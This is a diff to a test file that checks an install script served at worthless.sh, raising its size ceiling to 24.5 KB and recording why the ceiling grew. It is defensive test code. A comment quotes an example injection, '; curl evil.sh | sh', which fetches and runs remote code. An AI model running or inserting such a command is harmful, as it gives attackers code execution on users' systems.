@@ -343,18 +343,27 @@ describe("body integrity — install.sh shape and bounded size (H-08)", () => {
     expect(body.length).toBeLessThan(100_000);
   });
 
-  it("install-script body is bounded — under 20 KB tight ceiling (surgical injection guard)", async () => {
+  it("install-script body is bounded — under 24.5 KB tight ceiling (surgical injection guard)", async () => {
     // Per pen-tester Batch-3 review: 100 KB ceiling above is the corruption
     // guard, but a surgical 50-byte append (`; curl evil.sh | sh`) wouldn't
-    // trip it. Pin a tight 20 KB ceiling — install.sh is ~12 KB so 8 KB of
-    // slack is generous. Any appended payload large enough to matter is
-    // caught here. The 100 KB test stays as the corruption upper bound.
+    // trip it. Pin a tight ceiling near install.sh's actual size — any
+    // appended payload large enough to matter is caught here. The 100 KB
+    // test stays as the corruption upper bound.
+    //
+    // Ceiling history:
+    //   - Pre-Tier A: install.sh was ~12 KB. 20 KB ceiling = ~8 KB slack.
+    //   - Post-WOR-673 (A2 env scrub + PATH lockdown): install.sh is ~23 KB.
+    //     48-var unset block (11 attack classes) + PATH defense + honest
+    //     proxy_hints + threat-model comments add ~11 KB of substantive
+    //     security content. Ceiling at 24.5 KB keeps ~1.3 KB slack — tight,
+    //     intentionally. Each future bump must cite the WOR ticket that
+    //     justifies the growth and be a real discussion, not a ratchet.
     const res = await SELF.fetch("https://worthless.sh/", {
       headers: { "user-agent": CURL_UA },
     });
     expect(res.status).toBe(200);
     const body = await res.text();
-    expect(body.length).toBeLessThan(20_000);
+    expect(body.length).toBeLessThan(24_500);
   });
 
   it("install-script body Content-Length header matches actual byte length", async () => {
